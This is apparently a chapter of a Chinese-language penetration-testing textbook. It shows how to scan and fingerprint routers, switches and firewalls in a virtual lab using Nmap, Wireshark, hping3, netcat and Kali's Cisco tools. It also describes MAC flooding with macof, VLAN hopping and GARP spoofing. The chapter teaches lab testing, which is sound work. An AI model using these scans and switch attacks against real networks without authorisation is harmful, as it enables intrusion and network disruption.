# 第七章 设备评估

在本章中，我们将学习评估不同类型设备的技术。我们还将研究在测试过程中测试弱过滤器的方法。我们将涵盖以下主题：

+   评估路由器

+   评估交换机

+   攻击防火墙

+   识别防火墙规则

+   渗透过滤器的技巧

本章将为我们提供一种评估现有设备及其受保护程度的方法；发现我们要对抗的管理员的技能水平是很重要的。一个经过强化和良好配置的环境将提出重大挑战。然而，作为专业测试人员，我们的工作是接受挑战，看看我们能发现什么，并起草一份发现的报告。

# 评估路由器

从外部攻击者的测试位置开始，我们最有可能遇到的第一件事是路由器。也有可能是一个设备，但由于我们主要是从测试范围的角度出发，所以我们不太可能随身携带设备。我们在本书的早期已经展示了获取设备的地方；因此，如果您有这样的奢侈，您可以根据我们提供的信息建立自己的固定实验室。

我们在上一章中构建的外部架构是我们将进行所有测试的基础。我们分层架构的一个示例如下图所示：

![评估路由器](img/477-1_07_01.jpg)

前面的图表显示了我们整个外部架构，我们遇到的第一件事是路由器；因此，它是我们将用来进行测试的第一个设备。

与本书中过去所做的一样，我们希望集中在我们在特定时间点将处理的架构领域；因此，对于本节，我们将专注于以下图表中的架构：

![评估路由器](img/477-1_07_02.jpg)

为了进行这项测试，启动路由器和 Kali Linux 发行版的虚拟机。我们将使用 Kali 来测试路由器。在机器启动后，使用您创建的必需的用户名和密码登录到它们。

在路由器机器上，您需要启动路由器，打开一个终端窗口，然后输入`dynamips –H 7200`来启动路由器。一旦它启动，您需要通过打开另一个终端窗口并输入`dynagen config.net`来加载配置文件。一旦配置加载完成，输入`console R1`并访问正在运行的路由器，然后在路由器提示符上输入`en`进入路由器的特权模式。在这一点上，我们输入`show ip int brief`来显示路由器接口的配置。输出应该类似于以下截图所示：

![评估路由器](img/477-1_07-3.jpg)

与以前一样，我们希望确保我们的接口处于线路和协议`up`的状态，就像前面的截图所示的那样。一旦我们确保了这一点，我们将把注意力转向其他事项。

在 Kali 发行版中，有许多工具可供我们在测试范围内进行测试；其中最流行的之一是网络映射工具 Nmap。在 Kali 上打开一个终端窗口，并对连接到 VMnet8 的路由器接口进行扫描；如果您已经配置您的机器以匹配我们在书中使用的内容，您将输入`nmap -sS 192.168.177.10 –n`进行扫描。

这对目标进行了 SYN 或半开放扫描，这种情况下是路由器的 f0/0 接口。`n`选项告诉 Nmap 不要进行名称查找，并帮助我们的扫描更快地完成。

这次扫描的结果示例如下图所示：

![评估路由器](img/477-1_07-4.jpg)

对于阅读本文的人来说，您很可能知道我们有 65536 个可能的端口，而 Nmap 工具只在扫描中查看了其中的 1000 个。这是 Nmap 的默认设置，因此我们可以将其更改为扫描所有端口，我们现在将这样做。输入`nmap -sS –p 0-65535 192.168.177.10 –n`来扫描所有可能的端口。如果发现的服务是您想要攻击的服务，那么您可以跳过整个端口范围的扫描。

这个扫描将需要很长时间才能完成；您可以随时按空格键获取实时更新。

一旦这个非常长的扫描完成，路由器上只会有一个端口打开，因此这就成为我们对路由器本身的攻击向量。扫描进行到一半时的示例显示在以下截图中：

评估路由器

正如前面的截图所示，扫描需要很长时间才能完成，而且我们尤其不喜欢总共花费的时间在增加。这是因为扫描必须发送数据包到所有 65536 个端口。有方法可以加快扫描速度，但我们在这里不会担心这个问题。由于路由器上只有一个端口打开，因此这是我们进行攻击的唯一途径，我们可以连接到它并查看响应。

重要的是要注意，这只是一个路由器的默认配置，并没有进行任何加固；然而，我们实际上并没有太多的攻击面。我们有一个优势，那就是这是 Cisco 软件的旧 IOS 版本，这可能有助于我们前进，但我们将首先尝试一些基本的东西。由于端口 23 用于 telnet 开放，我们可以连接到它并查看连接的结果。在 Kali 上的终端窗口中，输入`telnet 192.168.177.10`来连接到路由器上的 telnet 服务；这方面的示例显示在以下截图中：

![评估路由器](img/477-1_07-6.jpg)

好消息是端口上有一个正在运行的服务，我们可以连接到它；坏消息是密码从未设置过，因此我们无法长时间访问该端口。连接到端口的另一种方法是使用工具 Netcat，我们现在将尝试一下，看看结果是否有所不同。在终端窗口中输入`nc 192.168.177.10 23`，使用 Netcat 工具连接到服务，看看我们是否有更好的运气；结果的示例显示在以下截图中：

![评估路由器](img/477-1_07-7.jpg)

一次又一次，我们并没有得到任何有价值的东西，所以我们继续尝试另一种方法。首先，我们需要意识到我们有点作弊，因为我们知道只有一个虚拟路由器。当然，这并不是在实际测试时的情况；因此，我们需要看看如何确定我们正在处理一个路由器。为了做到这一点，我们必须从数据包级别查看网络流量。

### 注意

每当我们想知道我们正在处理的是什么，总是要从数据包级别查看。幸运的是，Kali 发行版中包含了一个很好的工具，那就是 Wireshark。

在 Kali 中打开一个终端窗口，输入`wireshark &`来启动该工具。当工具启动时，您可以在连接到 VMnet8 交换机的接口上启动捕获，这应该是 eth0。示例显示在以下截图中：

![评估路由器](img/477-1_07-8.jpg)

一旦您验证了您的设置，点击**开始**以在 eth0 接口上开始捕获。一旦捕获开始，对路由器进行另一次扫描，并在 Wireshark 中查看结果。示例显示在以下截图中：

![评估路由器](img/477-1_07-9.jpg)

正如之前的截图所示，这是一个有访问控制列表的路由器；任何时候你看到一个 ICMP 目的地不可达的消息，告诉你有一个路由器会遇到。以下截图显示了 ACL 扫描的一个例子：

![评估路由器](img/477-1_07-10.jpg)

那么，现在我们该怎么办呢？我们知道有一个路由器，并且它有一个访问控制列表。你还会注意到，现在返回的结果将有一个 ACL，并且只会显示一个端口被关闭。我们的 telnet 去哪了？telnet 端口是开放的，因为那个路由器上没有 ACL，但是一旦你应用了 ACL，规则就被设置为默认拒绝，因此，你只会看到管理员明确允许的东西是开放的。

这就是测试的现实。我们很幸运，这个管理员没有阻止 ICMP 回复消息，所以我们至少可以确定我们有一个路由器。我们接下来可以尝试的是看看 Nmap 告诉我们关于路由器的信息。

使用 Nmap 工具，我们可以尝试进行枚举扫描。为此，我们可以使用`–A`选项，所以我们现在将尝试这样做。在终端窗口中，输入`nmap –A 192.168.177.10`命令来查看我们可以从路由器那里收集到什么。以下截图显示了这次扫描的结果的一个例子：

![评估路由器](img/477-1_07-11.jpg)

事实证明，即使是枚举扫描也没有太大帮助。这是因为路由器对工具提供的帮助不多。再次强调，我们知道我们会遇到一个路由器，这就是为什么我们从它开始的原因。我们看到端口 80 的报告被关闭，所以让我们进一步调查一下。在你进行测试时要保持的一个重要事情是在 Wireshark 中捕获流量，并查看目标在数据包级别如何响应。

既然我们知道有一个端口 80 的响应，我们可以将其作为下一个获取信息的尝试。在你的终端窗口中，输入`nmap –sS –p 80 192.168.177.10`来将扫描定向到提供响应的端口；在你的 Wireshark 显示中，你可能想设置一个过滤器`tcp.port == 80`来集中在我们发送的流量上。以下截图显示了扫描结果的一个例子：

![评估路由器](img/477-1_07-12.jpg)

显示 Wireshark 显示的屏幕（裁剪的文本不重要）

这告诉我们，当我们连接到端口 80 时，我们收到了一个 RST 和 ACK 数据包；这意味着端口根据 RFC 被关闭。在我们继续之前，关于 RFC 的一点说明：如果你想精通测试的艺术，特别是在数据包级别，你需要熟悉它们；然而，正如你们中的许多人可能知道的那样，它们并不令人兴奋。一个可以帮助你获取 RFC 信息的网站是 Network Sorcery 网站；它提供了关于所有协议和其他网络数据的优秀信息，强烈建议你在不确定某些东西如何工作时花一些时间去审阅它们。你可以在[`www.networksorcery.com/`](http://www.networksorcery.com/)找到这个网站。

你想要关注的区域是 RFC 源书；以下截图显示了信息的一个例子：

![评估路由器](img/477-1_07-13.jpg)

好的，现在是时候回到手头的任务了。为什么 Nmap 只显示端口 80，而没有其他端口被关闭？我们使用 Wireshark 确定当向其发送 SYN 数据包时，端口会以 RST 和 ACK 标志响应，那么接下来我们该怎么办呢？

这是我们可以尝试一些其他事情来查看端口的响应。我们知道端口报告为关闭；因此，让我们尝试 HTTPS 端口，看看我们会得到什么样的响应。在你的 Wireshark 过滤器中，输入`tcp.port == 443`，同时重新启动数据包捕获也是一个好主意。导航到**捕获** | **重新启动**来清理你收集到的所有流量。在你的终端窗口中，输入`nmap –sS –p 443 192.168.177.10`来探测 HTTPS 端口 443。一旦扫描完成，注意结果。以下是结果的示例：

![评估路由器](img/477-1_07-14.jpg)

正如你从之前的屏幕截图中看到的，端口报告的状态不是关闭，而是被过滤；为什么会有这种差异？首先，让我们看一下 Wireshark 中的结果。以下是 Wireshark 结果的示例：

![评估路由器](img/477-1_07-15.jpg)

正如我们从之前的屏幕截图中看到的，目标现在没有响应，这就是为什么 Nmap 报告它为被过滤的原因；因此，我们看到端口 80 生成了响应，而端口 443 没有，这告诉我们端口 80 的流量有某种规则，而端口 443 的流量没有。这些是我们应该记录的事情，这样当我们再次看到它时，我们就知道发生了什么。

我们还有一次尝试要做，然后我们将继续尝试针对路由器获取更多的结果。根据 RFC 793，当一个端口发送一个包含非法标志组合的数据包时，如果它是开放的，它不应该做出响应，如果它是关闭的，它应该做出一个带有 RST 标志的数据包响应。我们现在将尝试这样做。在你的终端窗口中，输入`nmap –sX –p 80 192.168.177.10`来向端口发送一个非法标志的数据包；在这种情况下，这是一种圣诞树扫描。扫描完成后，再次对端口 443 进行相同的扫描；输入`nmap –sX –p 80 192.168.177.10`并比较结果。以下是扫描结果的示例：

![评估路由器](img/477-1_07-16.jpg)

那么，我们能够确定什么？从之前的屏幕截图中，我们看到作为路由器的机器似乎遵循 RFC 793；这可以帮助减少可能的设备，因为一些供应商如微软和 OpenBSD UNIX 不遵循 RFC。我们还可以假设，由于市场上大多数设备都是运行 Cisco 路由器，这可能是我们要处理的设备。不幸的是，到目前为止，我们对设备的型号还不太了解，但我们知道它运行着 ACL，并且对端口 80 有一个规则。

我们已经基本上用尽了 Nmap 扫描选项，直接针对路由器接口。当我们通过设备进行更多尝试时，我们将尝试更多的工具；目前我们只是测试设备，并当然，记录结果。

在我们继续下一步之前，我们还有一件事要做，那就是验证我们的假设。当我们用 Nmap 扫描时，端口 80 显示为关闭，当我们尝试端口 443 时，我们得到一个被过滤的报告。我们假设这是因为 ACL 中必须有一些规则来关闭端口 80。好吧，我们永远不想假设，我们想确保我们的假设是正确的；因此，我们最好的选择是为另一个端口添加一个规则，然后看看会发生什么。我们现在就来做这件事。在你的路由器上，输入以下命令：

```
conf t
ip access-list extended External
permit tcp any any eq 22

```

按下*Ctrl* + *Z*，然后输入以下命令：

```
show access-lists

```

以下是示例的屏幕截图：

![评估路由器](img/477-1_07-17.jpg)

正如之前的屏幕截图所示，我们现在有一个规则允许我们的端口 80 流量和端口 22 流量。值得注意的是，由于我们刚刚输入了规则，所以没有像其他规则那样的匹配。

我们现在准备测试我们的理论。在您的 Kali 发行版中，在终端窗口中输入`nmap 192.168.177.10 –n`进行默认扫描。正如之前讨论的，`n`选项有望加快我们的扫描速度。扫描结束后，审查结果；一个示例如下面的屏幕截图所示：

![评估路由器](img/477-1_07-18.jpg)

任务成功！我们现在已经证明，当路由器（在这种情况下是思科路由器）有一个端口规则时，它将响应该端口。我们现在知道，在这种情况下有两个开放的端口；因此，我们有两个潜在的向量可以让我们访问路由器进行攻击。我们现在准备继续并尝试找到攻击路由器设备的方法。

由于 Kali 发行版是一个渗透测试工具包，很可能有人以前遇到过思科路由器，我们可以求助于它，看看它可能有什么可以帮助我们继续测试路由器的东西。事实上，不仅在发行版中有适用于思科的工具，而且它还有自己的菜单项！

在 Kali Linux 中，导航到**应用程序** | **Kali Linux** | **漏洞分析** | **思科工具**，并显示包含在适用于思科路由器的发行版中的可能工具。一个示例如下面的屏幕截图所示：

![评估路由器](img/477-1_07-19.jpg)

显示可能的工具的屏幕，这些工具包含在适用于思科路由器的发行版中（裁剪的文本不重要）

正如先前的屏幕截图所示，当我们遇到思科设备时，有许多工具可供使用。从这里开始，主要是试验和错误的问题。

最好的开始地方是顶部，所以我们现在将看一下第一个工具，思科审计工具。一旦您选择它，一个窗口将打开并提供工具的选项，如下面的屏幕截图所示：

![评估路由器](img/477-1_07-20.jpg)

当您审查工具的输出时，它实际上并没有太多帮助；在哪里可以运行这个工具的命令？不幸的是，这在 Kali Linux 发行版中有时会发生。如果我们幸运的话，至少我们会在目录中，这样我们就可以弄清楚。在您的终端窗口中，输入`ls`，然后输入`pwd`以显示我们所在的目录，如下面的屏幕截图所示：

![评估路由器](img/477-1_07-21.jpg)

当您审查先前的屏幕截图和工具的输出时，您有幸吗？不，似乎菜单没有把我们放在正确的目录中，它把我们留在了`root`目录中。那么现在我们该怎么办？嗯，我们可以尝试一些选项，但现在我们不会花太多时间在它们上面；我们只会看一两个。这是 Linux，所以我们可以尝试主页；我们现在就来试试。在终端窗口中，输入`man cisco-auditing-tool`来查看是否有主页可用。我们可能可以使用更好的命令名称来找到它，但我们真的没有太多线索，所以我们只会尝试一些选项。一个示例如下面的屏幕截图所示：

![评估路由器](img/477-1_07-22.jpg)

嗯，正如先前的屏幕截图所示，我们在这里做得并不好，这就是我们将要经历这个过程的原因，因为这经常会发生。那么现在我们该怎么办？嗯，是时候引入互联网了，在搜索互联网后，我们发现 Kali Linux 中的工具使用`CAT`文件。所以，我们现在将尝试一下。在您的终端窗口中，输入`CAT`来看看会发生什么。

一个示例如下面的屏幕截图所示：

![评估路由器](img/477-1_07-23.jpg)

最后，正如前面的截图所示，我们已经找到了该工具的命令。当我们审查选项时，我们看到第一个选项是针对单个主机的；因此，由于我们有一个目标设备，我们将从那里开始。我们将输入`CAT –h 192.168.177.10`并观察输出。示例显示在以下截图中：

![评估路由器](img/477-1_07-24.jpg)

从前面截图的输出中，很明显这个工具寻找 telnet 端口 23 是否打开，所以我们知道情况并非如此。但是，我们可以记录这个工具，以便在 telnet 打开时重新访问。

我们现在将继续尝试另一个工具。这是我们测试时的过程；我们希望查看所有不同的工具和方法来对抗我们测试的目标；因此，您必须记录什么有效，什么无效，因为这将在您对抗实际目标时为您节省大量时间。

我们将看看下一个工具，也是列表中的下一个工具，即 Cisco 全局利用程序。此工具的选项示例显示在以下截图中：

![评估路由器](img/477-1_07-25.jpg)

当我们审查工具的选项时，我们发现大多数选项需要 Web 服务器或 telnet 服务可用。由于我们知道情况并非如此，我们可以转向下一个选项。但是，请记住记录工具要求，以便以后测试。我们可以关闭访问列表，然后打开测试选项。但是，在大多数情况下，管理员不会打开这些选项，默认情况下也不会打开。它们曾经是默认开启的，但是像安全领域的大多数事物一样，它们已经加强了安全性，不再是这种情况。

我们可以继续尝试不同的工具，但我们将为您节省时间。当我们扫描路由器时，我们无法找到有关它的太多信息，因此 ACL 基本上阻止我们发现太多。因此，为了证明这一点，我们现在将删除 ACL 并查看它是否有所帮助。在您的 Cisco 路由器中，输入以下命令：

```
conf t
int f0/0
no ip access-group External in

```

按下*Ctrl* + *Z*，然后执行以下命令：

```
show ip int f0/0

```

我们要验证 ACL 是否不再在接口上。示例显示在以下截图中：

![评估路由器](img/477-1_07-26.jpg)

现在我们已经清除了 ACL，我们可以尝试使用 Nmap 进行另一次扫描。我们可以进行正常的默认扫描，但我们将从枚举扫描开始；因此，在 Kali Linux 的终端窗口中，输入`nmap –A 192.168.177.10 –n`并扫描目标。结果的示例显示在下一个截屏中：

![评估路由器](img/477-1_07-27.jpg)

哇！这真是大不相同！现在，如果我们的目标没有配置 ACL，我们可以发现关于目标的大量信息，但您很可能会遇到 ACL，那么您该如何处理呢？嗯，在最初的发现中，您可以要求提供信息，他们可能会提供。您也可以尝试不同的位置；虽然外部接口受到保护非常常见，但内部接口却不太常见。因此，在某些情况下，这将是继续的最佳选择。

从这里开始，您将注意到不同的结果，然后记录什么有效，什么无效；此外，您将注意到可以进行的不同配置更改以及这些更改如何影响结果。实际上，您现在应该运行 Kali 中的所有工具，并查看在没有 ACL 的情况下有何不同；如常，记录您的发现。

如果我们找到攻击路由器的方法，那当然很重要，但更重要的是路由器是内部的保护设备，我们的前进方式是看如何穿越路由器；这是我们将在本章稍后进行的。现在，我们要讨论的是当我们遇到使用 Linux 机器或其他设备作为其路由器和过滤设备的人时的结果。

由于我们已经基本上耗尽了与可能遇到的作为边界设备的路由器的工作，现在是时候看看如果我们遇到一个使用 iptables 作为其路由器并提供 ACL 功能的环境时的结果了。为此，我们需要启动我们在第四章中配置了 iptables 的虚拟机，*识别范围架构*。您可能希望暂停我们一直在使用作为路由器的机器，以避免冲突和系统资源。我们将在本章后面再次讨论这台机器和路由器设备。

一旦您的虚拟机启动，使用所需的凭据登录，并打开一个终端窗口。在终端窗口中，输入`iptables –L`以显示当前配置，如下屏幕截图所示：

![评估路由器](img/477-1_07-28.jpg)

我们看到我们为 http 流量设置了规则，所以现在我们知道我们要使用我们的 Kali Linux 机器扫描这台机器。在您的 Kali Linux 机器上，打开一个终端窗口，输入`nmap 192.168.177.15`来扫描 iptables eth0 接口。这次扫描的结果示例如下屏幕截图所示：

![评估路由器](img/477-1_07-29.jpg)

从前面显示我们扫描结果的屏幕截图中，我们知道我们有 ssh 和端口 111 开放。这与我们扫描路由器时有显著不同，因为 iptables 正在机器上运行；因此，结果将显示机器上开放的内容。这为我们提供了一些攻击途径，但问题是我们没有真正测试 iptables 规则。这是因为我们不关心 iptables 规则；这次扫描只扫描了机器的接口，与我们的 iptables 规则无关。对于路由器，我们有一个可以扫描的接口。由于我们在这里没有，我们只扫描了机器；但这是确定您是否会遇到作为路由器或实际路由器设备的机器的好方法。

那么，现在我们该怎么办呢？嗯，我们有几个选择。由于 ssh 是开放的，我们可以尝试暴力破解，或者如果我们知道有端口开放，它将帮助 Nmap 更好地进行枚举。所以，我们现在尝试一下。在终端窗口中，输入`nmap –A 192.168.177.15`进行枚举扫描。

这里有一部分输出的示例，如下屏幕截图所示：

![评估路由器](img/477-1_07-30.jpg)

屏幕显示了输出的部分示例（裁剪的文本不重要）

从前面的屏幕截图中，我们看到我们有额外的信息。这是因为我们只是查看 iptables 所在的机器，而不是规则。我们可以做一些事情来涉及 iptables 规则，但我们将在本章后面再讨论。根据我们在这里看到的，还有其他事情可以做吗？答案是肯定的。我们看到我们有 OpenSSH 版本，所以我们可以使用本书中讨论的技术，尝试找到可能适用于这个 SSH 版本的任何漏洞。我们可以在互联网上搜索。截至目前，有几处提到 6.0 版本存在一些拒绝服务漏洞，但由于这在渗透测试范围内很少被要求，我们将不在这里讨论，欢迎您自行尝试。

在我们继续之前，还有一件事要做，那就是在数据包级别查看流量。在 Kali Linux 的终端窗口中输入`wireshark &`启动 Wireshark 工具。当工具打开时，通过导航到**eth0** | **Capture**来在你的 eth0 接口上开始捕获。一旦捕获开始，通过另一个终端窗口运行你的 Nmap 扫描，然后在 Wireshark 中查看结果。因为我们真的只想看看是否有任何消息显示我们在过滤器中遇到的，你可以输入一个显示过滤器。我们现在就来做这个。在过滤窗口中输入`icmp`来查看目标是否发送了任何 ICMP 流量。

以下是一个示例截图：

![评估路由器](img/477-1_07-31.jpg)

屏幕显示目标是否发送了任何 ICMP 流量（裁剪的文本不重要）

之前的屏幕截图确实显示了一些 ICMP，但你会注意到这些都不是我们如果有过滤器的话会看到的 ICMP 类型。数据包 1702 是根据 RFC 对关闭的**用户数据报协议**（**UDP**）端口的响应。

我们还有一个过滤器，我们将应用以结束这一部分。作为测试人员，我们尽快获取数据非常重要，这就是 Wireshark 过滤器的威力所在。然而，在我们这样做之前，有什么我们错过了吗？希望你还记得 Nmap 默认只扫描 1000 个端口，因此我们并没有扫描所有的端口。你可能已经扫描了端口；作为提醒，我们使用`-p`选项进行端口扫描，你应该扫描所有端口，以便你的测试结果更完整。一旦你完成了扫描，Wireshark 中将会有几个数据包需要你查看。为了让我们的工作更容易，输入以下内容到 Wireshark 的过滤窗口中：

```
tcp.flags.syn == 1 and tcp.flags.ack == 1

```

一旦你输入了过滤器，点击**Apply**应用过滤器。现在，所有设置了 SYN 和 ACK 标志的数据包将被显示；因此，你现在可以快速查看目标上开放的端口。以下是一个示例截图：

![评估路由器](img/477-1_07-32.jpg)

屏幕显示目标上有哪些端口是开放的快速参考（裁剪的文本不重要）

如果你更喜欢看到端口号而不是通常分配给该端口的协议名称，你可以在 Wireshark 的设置中更改这个。导航到**Edit** | **Preferences** | **Name Resolution**，并取消**Resolve transport names**下的复选标记。以下是一个示例截图：

![评估路由器](img/477-1_07-33.jpg)

这是我们目前对 iptables 机器所做的全部。正如我们提到的，当我们实际开始针对规则集进行测试时，我们将重新访问这一点。我们能够通过路由器设备做到这一点，但我们将与 iptables 机器一起通过路由器 ACL 进行测试。

# 评估交换机

我们很可能会遇到的另一个设备是交换机。由于交换机是单播设备，只会向所有端口发送广播流量，当我们面对交换机时，我们希望尝试创建一种情况，使交换机要么将数据包错误地转发到我们希望的错误目的地，要么使交换机向所有端口发送所有信息，实际上成为一个集线器。

我们要查看的攻击称为二层攻击。虽然确实有交换机可以操作到**开放系统互连**（**OSI**）模型的七层，但我们将专注于更传统的在二层操作的方法。

## MAC 攻击

多年来，我们一直享受着使用一个名为**macof**的优秀工具来淹没交换机的奢侈。您可以在[`linux.die.net/man/8/macof`](http://linux.die.net/man/8/macof)上阅读更多关于它的信息。您可能仍然可以使用 macof 工具取得一些成功，但通常只有在遇到 2006 年之前的交换机时才有效。我们想淹没交换机以将其转换为集线器，以便我们可以拦截潜在的攻击流量。

如果您遇到一个较旧的交换机，macof 可以在 70 秒内淹没平均**内容寻址内存**（**CAM**）表。由于遇到较旧的交换机是相当常见的，因此至少要了解一下该工具的使用方法是很重要的。我们在 Kali Linux 发行版中可以使用 macof 工具。在 Kali 机器上，导航到**应用程序** | **Kali Linux** | **压力测试** | **网络压力测试** | **macof**以打开 macof 工具，如下截图所示：

![MAC 攻击](img/477-1_07-34.jpg)

这将打开 macof 工具，正如在 Kali Linux 发行版中通常的那样，有一个显示工具使用的输出。工具使用示例如下截图所示：

![MAC 攻击](img/477-1_07-35.jpg)

正如前面的截图所示，该工具的使用非常简单。再次强调，这是您在遇到较旧的交换机时可以使用的工具。现在我们将看一下针对第二层交换机的另一种攻击。

## VLAN 跳跃攻击

我们将要看的下一个攻击是跨越 VLAN 的技术。许多管理员在配置交换机时会犯错误，因此我们有时可以跨越 VLAN。我们使用 VLAN 跳跃来访问分配给主机的 VLAN 不可用的资产。

在 VLAN 跳跃中，我们利用了一个事实，即干线具有对所有 VLAN 的访问权限。为了执行攻击，我们必须欺骗支持干线协议的交换机。为了使其工作，交换机必须配置为允许我们执行此操作。这上的默认设置是**auto**，这将允许我们的攻击起作用。如果欺骗成功，我们将可以访问网络上的所有 VLAN。

## GARP 攻击

**Gratuitous Address Resolution Protocol**（**GARP**）攻击是针对 ARP 没有认证进行的，因此您可以成功地欺骗 ARP 地址。该过程是发送到广播地址的 GARP，有些操作系统将覆盖现有的 ARP 条目，即使该条目已经被静态输入。

所有这些攻击都是可能的，但在大多数情况下，除非我们建立一个实际的固定范围，否则我们将无法构建和测试它们。

# 攻击防火墙

接下来，我们想要像之前遇到路由器时那样攻击防火墙。我们的成功将取决于管理员以及他们如何配置他们的环境。

我们将使用我们创建的**Smoothwall**防火墙，并将从连接到 VMnet2 交换机的红色接口对其进行攻击。我们将使用与我们对路由器使用的相同过程，并查看我们在对防火墙进行攻击时可以发现什么。我们的测试范围如下图所示：

![攻击防火墙](img/477-1_07_36.jpg)

正如前面的图表所示，我们将只集中在 Smoothwall 机器的外部接口上。我们要做的第一件事是使用我们流行的网络扫描工具 Nmap，并查看我们可以从机器上发现什么。

我们需要将我们的 Kali Linux 发行版连接到 VMnet2 交换机。如下截图所示的示例： 

![攻击防火墙](img/477-1_07-37.jpg)

在 Kali 机器中验证设置后，登录并在 Smoothwall 机器中输入`ifconfig eth0`以显示机器的 IP 地址信息，因为我们需要这个信息输入到我们的工具中。以下截图显示了示例：

![攻击防火墙](img/477-1_07-38.jpg)

现在我们有了 IP 地址，我们准备进行扫描。在您的 Kali Linux 机器上，输入`nmap –A 10.2.0.131`来扫描 Bastion Host 机器的 eth0 接口。如果您的 IP 地址不同，那么您将输入目标 IP 地址。以下截图显示了部分结果的示例：

![攻击防火墙](img/477-1_07-39.jpg)

再次，我们确实没有太多线索。我们看到机器上只有一个端口是打开的，由于 Nmap 工具没有足够的信息来尝试对操作系统进行指纹识别，我们需要查看数据包级别。通过输入`wireshark &`在 Kali 上启动 Wireshark，并在 eth1 接口上开始数据包捕获。一旦数据包捕获开始，再次运行 Nmap 扫描，然后在 Wireshark 中查看扫描结果。

以下截图显示了扫描的部分示例：

![攻击防火墙](img/477-1_07-40.jpg)

屏幕显示了扫描部分的示例（裁剪的文本不重要）

当您查看前面的截图时，您会看到**ident**端口确实响应为关闭状态。实际上，几乎所有其他端口都没有响应，所以至少我们有一些线索。这是因为如果有 Internet 连接，Smoothwall 安装就会注册，并且身份受到端口 113 的控制。

在我们完成本章的工作时，我们发现了一件事，即在扫描路由器时使用了 ICMP 错误消息，因此我们想看看 Smoothwall 机器是否返回了任何 ICMP 消息。始终从新捕获开始是一个好主意，因此在 Wireshark 中，导航到**捕获** | **重新启动**以在接口上开始新的捕获。为了使您的任务更容易，输入 ICMP 过滤器并单击**应用**。然后返回到您的终端窗口，再次运行 Nmap 扫描，并观察 Wireshark 中的结果。

以下截图显示了结果的示例：

![攻击防火墙](img/477-1_07-41.jpg)

我们有 ICMP 流量，这可能有助于我们确定是否会遇到防火墙。接下来，我们将想知道哪个端口响应了 ICMP 消息。根据 RFC 793，这是关闭的 UDP 端口的有效响应。因此，我们需要确定这是响应的 UDP 端口，还是 TCP 端口。我们将再次运行我们的扫描，并仅查看 TCP 流量，方法是输入`nmap –sS 10.2.0.131`并在扫描期间观察 Wireshark。以下截图显示了结果的示例：

![攻击防火墙](img/477-1_07-42.jpg)

屏幕显示了结果的示例（裁剪的文本不重要）

从前面的截图中，我们看到 TCP 端口引起了响应，因此它不遵循 RFC。我们现在可以得出结论，我们有了一个防火墙，并且我们可以尝试攻击它或穿过它。

这再次是测试的现实；我们可能会发现一个防火墙，除非我们对防火墙有所了解，否则成功攻击它可能会很困难，甚至不可能。在这种情况下，如果我们没有知道这是 Smoothwall 防火墙的优势，我们对所遇到的防火墙类型几乎一无所知。

您可以继续尝试获取有关防火墙的信息，以便攻击它，但我们将继续前进，因为在使用 Smoothwall 防火墙多年后，发现通过它或使用某种社会工程学方法来获取其后面的访问权限要容易得多。

# 识别防火墙规则

在本章中，我们早些时候确定了路由器上有规则的端口；这是您希望继续在您的范围内练习的技术，但我们还没有具体看防火墙本身。如果我们想成功地穿过它，我们需要看看防火墙允许和阻止什么。正如之前提到的，这可能是一个重大挑战，而且往往我们只能使用已打开的端口来穿过防火墙。

我们提到路由器是无状态防火墙的一种形式，并且我们展示了对应用了 ACL 的路由器进行 Nmap 扫描将显示已设置规则的端口。我们不仅讨论了这一点，而且还证明了它。我们将进一步进行这一步骤，首先是我们的路由器，然后是我们的 iptables 和 Smoothwall 防火墙。

我们想看看哪些流量被允许通过无状态防火墙。由于我们之前已经用扫描做过了，所以我们只是简要地看一下测试规则的另一种方法。在本节中，我们将使用以下屏幕截图中显示的设计：

![识别防火墙规则](img/477-1_07_43.jpg)

正如之前的屏幕截图所示，我们有第二个网络，由 VMnet2 交换机表示，因此启动所需的机器并登录到它们。在您的路由器机器上，打开一个终端窗口并输入以下命令来运行您的 dynamips 机器：

```
dynamips –H 7200
dynagen config.net

```

### 注意

确保您为每个命令打开一个终端窗口，并导航到`/opt`目录。

一旦您的路由器启动，输入以下命令：

```
console R1
en
show ip int f0/0

```

验证您的设置如图所示。接口上有一个访问列表；如果没有，那么您必须放上一个。如果需要帮助，我们在本章的前面已经覆盖了这些步骤。以下是一个示例：

![识别防火墙规则](img/477-1_07-44.jpg)

从之前的屏幕截图中，我们看到这个接口上有 ACL，所以我们准备做一些测试。我们首先要做的是验证我们的路由。如果没有设置，那么我们需要创建路由。同样，这是我们已经做过的事情，所以我们不会在这里覆盖这些步骤。

### 注意

您必须在 Kali 机器和 OWASP 机器上设置路由。

如果您的路由设置好了，您应该能够访问**OWASP**机器的 Web 服务器。使用 Netcat 或 telnet 验证您是否可以连接到该机器；在这里，我们将使用 Netcat。在 Kali Linux 机器上，输入`nc 10.3.0.132 80`并在终端窗口中验证您是否可以连接到该端口；如果成功了，那么路由配置正确并且工作正常。连接后，输入以下内容：

```
GET / http/1.1

```

以下是结果的示例：

![识别防火墙规则](img/477-1_07-45.jpg)

一旦路由设置好了，我们就准备开始测试规则。我们将从 Nmap 扫描开始。输入`nmap 10.2.0.132`并查看结果；现在我们将扫描路由器，所以 ACL 起作用了。以下是结果的示例：

![识别防火墙规则](img/477-1_07-46.jpg)

从之前的屏幕截图中，我们看到，由于我们现在要穿过 ACL，我们实际上得到了通过无状态防火墙允许的端口的结果。我们将再看一个，然后继续测试其他的。我们还可以使用工具**Hping**来查看规则。在 Kali 的终端窗口中，输入`hping3 –S –p 80 10.2.0.132`并注意结果。现在，我们要输入一个我们知道没有打开的端口的命令。输入`hping3 –S –p 22 10.2.0.132`并注意结果。以下是一个示例：

![识别防火墙规则](img/477-1_07-47.jpg)

根据我们所看到的，很容易确定无状态过滤器的规则，但实际防火墙呢？我们将首先看一下 iptables 的反应。关闭或挂起您的路由器，并启动您的 iptables 机器。

### 注意

我们必须调整我们的路由以指向正确的接口，并且如果 iptables 机器上没有打开 IP 转发，我们还必须启用 IP 转发。

一旦您设置好了路由和转发，就可以开始测试 iptables 规则。在您的 Kali 机器上，可以使用 Netcat 或 Nmap 进行测试，看看是否可以路由到 OWASP 机器的 80 端口。或者，您也可以打开浏览器尝试。浏览器方法的示例如下截图所示：

![识别防火墙规则](img/477-1_07-48.jpg)

现在我们已经设置好了路由，我们准备测试 iptables 规则集。与之前一样，我们将从 Nmap 开始测试。在 Kali 中，输入`nmap 10.2.0.132`并查看结果。结果的示例如下截图所示：

![识别防火墙规则](img/477-1_07-49.jpg)

